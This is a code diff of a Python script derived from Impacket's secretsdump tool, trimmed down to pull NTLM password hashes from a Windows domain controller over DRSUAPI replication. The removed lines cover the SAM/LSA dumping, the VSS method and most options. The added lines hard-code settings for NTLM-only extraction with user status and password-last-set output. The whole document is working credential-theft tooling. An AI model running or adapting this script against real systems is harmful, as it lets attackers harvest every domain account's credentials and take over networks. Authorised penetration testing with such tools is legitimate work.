@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python   
 from __future__ import division
 from __future__ import print_function
 import argparse
@@ -12,7 +12,7 @@ from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
 
-from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
+from impacket.examples.secretsdump import  RemoteOperations, NTDSHashes
 from impacket.krb5.keytab import Keytab
 try:
     input = raw_input
@@ -86,11 +86,7 @@ class DumpSecrets:
 
                 self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                 self.__remoteOps.setExecMethod(self.__options.exec_method)
-                if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
-                    self.__remoteOps.enableRegistry()
-                    bootKey             = self.__remoteOps.getBootKey()
-                    # Let's check whether target system stores LM Hashes
-                    self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                
             except Exception as e:
                 self.__canProcessSAMLSA = False
                 if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
@@ -100,50 +96,8 @@ class DumpSecrets:
                     logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                 else:
                     logging.error('RemoteOperations failed: %s' % str(e))
-
-            # If RemoteOperations succeeded, then we can extract SAM and LSA
-            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
-                try:
-                    if self.__isRemote is True:
-                        SAMFileName         = self.__remoteOps.saveSAM()
-                    else:
-                        SAMFileName         = self.__samHive
-
-                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-                    self.__SAMHashes.dump()
-                    if self.__outputFileName is not None:
-                        self.__SAMHashes.export(self.__outputFileName)
-                except Exception as e:
-                    logging.error('SAM hashes extraction failed: %s' % str(e))
-
-                try:
-                    if self.__isRemote is True:
-                        SECURITYFileName = self.__remoteOps.saveSECURITY()
-                    else:
-                        SECURITYFileName = self.__securityHive
-
-                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
-                                                   isRemote=self.__isRemote, history=self.__history)
-                    self.__LSASecrets.dumpCachedHashes()
-                    if self.__outputFileName is not None:
-                        self.__LSASecrets.exportCached(self.__outputFileName)
-                    self.__LSASecrets.dumpSecrets()
-                    if self.__outputFileName is not None:
-                        self.__LSASecrets.exportSecrets(self.__outputFileName)
-                except Exception as e:
-                    if logging.getLogger().level == logging.DEBUG:
-                        import traceback
-                        traceback.print_exc()
-                    logging.error('LSA hashes extraction failed: %s' % str(e))
-
-            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
-            if self.__isRemote is True:
-                if self.__useVSSMethod and self.__remoteOps is not None:
-                    NTDSFileName = self.__remoteOps.saveNTDS()
-                else:
-                    NTDSFileName = None
-            else:
-                NTDSFileName = self.__ntdsFile
+            NTDSFileName = None
+           
 
             self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                            noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
@@ -153,46 +107,17 @@ class DumpSecrets:
                                            printUserStatus= self.__printUserStatus)
             try:
                 self.__NTDSHashes.dump()
+
             except Exception as e:
-                if logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
-                    # We don't store the resume file if this error happened, since this error is related to lack
-                    # of enough privileges to access DRSUAPI.
-                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
-                    if resumeFile is not None:
-                        os.unlink(resumeFile)
                 logging.error(e)
                 if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                     logging.info("You just got that error because there might be some duplicates of the same name. "
                                  "Try specifying the domain name for the user as well. It is important to specify it "
                                  "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
-                elif self.__useVSSMethod is False:
-                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                
             self.cleanup()
         except (Exception, KeyboardInterrupt) as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
             logging.error(e)
-            if self.__NTDSHashes is not None:
-                if isinstance(e, KeyboardInterrupt):
-                    while True:
-                        answer =  input("Delete resume session file? [y/N] ")
-                        if answer.upper() == '':
-                            answer = 'N'
-                            break
-                        elif answer.upper() == 'Y':
-                            answer = 'Y'
-                            break
-                        elif answer.upper() == 'N':
-                            answer = 'N'
-                            break
-                    if answer == 'Y':
-                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
-                        if resumeFile is not None:
-                            os.unlink(resumeFile)
             try:
                 self.cleanup()
             except:
@@ -201,12 +126,10 @@ class DumpSecrets:
     def cleanup(self):
         logging.info('Cleaning up... ')
         if self.__remoteOps:
+            
             self.__remoteOps.finish()
-        if self.__SAMHashes:
-            self.__SAMHashes.finish()
-        if self.__LSASecrets:
-            self.__LSASecrets.finish()
         if self.__NTDSHashes:
+            
             self.__NTDSHashes.finish()
 
 
@@ -222,37 +145,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                       "the remote machine without executing any agent there.")
 
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
-                                                       ' (if you want to parse local files)')
-    #parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
-    #parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    #parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
-    #parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
-    #parser.add_argument('-security', action='store', help='SECURITY hive to parse')
-    #parser.add_argument('-sam', action='store', help='SAM hive to parse')
-    #parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
-    #parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
-    #                     'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
-    #                     'state')
-    #parser.add_argument('-outputfile', action='store',
-    #                    help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
-    #parser.add_argument('-use-vss', action='store_true', default=False,
-    #                    help='Use the VSS method insead of default DRSUAPI')
-    #parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
-    #                    'method to use at target (only when using -use-vss). Default: smbexec')
-    #group = parser.add_argument_group('display options')
-    #group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
-    #                   help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
-    #                        'Implies also -just-dc switch')
-    #group.add_argument('-just-dc', action='store_true', default=False,
-    #                    help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
-    #group.add_argument('-just-dc-ntlm', action='store_true', default=False,
-    #                   help='Extract only NTDS.DIT data (NTLM hashes only)')
-    #group.add_argument('-pwd-last-set', action='store_true', default=False,
-    #                   help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
-    #group.add_argument('-user-status', action='store_true', default=False,
-    #                    help='Display whether or not the user is disabled')
-    #group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     group = parser.add_argument_group('authentication')
 
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
@@ -262,7 +155,6 @@ if __name__ == '__main__':
                              ' the ones specified in the command line')
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                             ' (128 or 256 bits)')
-    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
     group = parser.add_argument_group('connection')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                  'ommited it use the domain part (FQDN) specified in the target parameter')
@@ -293,18 +185,13 @@ if __name__ == '__main__':
     options.user_status = True
     options.history = False
     options.hashes = None
-    #options.no_pass = False
-    #options.k = False
     options.aesKey = None
     options.keytab = None
     options.dc_ip = None
 
     
-    # Init the example's logger theme
     logger.init(options.ts)
 
-    
-    
     logging.getLogger().setLevel(logging.INFO)
 
     domain, username, password, remoteName = parse_target(options.target)
@@ -325,30 +212,6 @@ if __name__ == '__main__':
 
    
 
-    options.ts = False
-    options.debug = False
-    options.system = None
-    options.bootkey = None
-    options.security = None
-    options.sam = None
-    options.ntds = None
-    options.resumefile = None
-    options.outputfile = 'dumb'
-    options.use_vss = False
-    options.exec_method = 'smbexec'
-    options.just_dc_user = None
-    options.just_dc_ntlm = True
-    options.pwd_last_set = True
-    options.user_status = True
-    options.history = False
-    options.hashes = None
-    #options.no_pass = False
-    #options.k = False
-    options.aesKey = None
-    options.keytab = None
-    options.dc_ip = None
-
-    print(options)
     dumper = DumpSecrets(remoteName, username, password, domain, options)
 
     try:
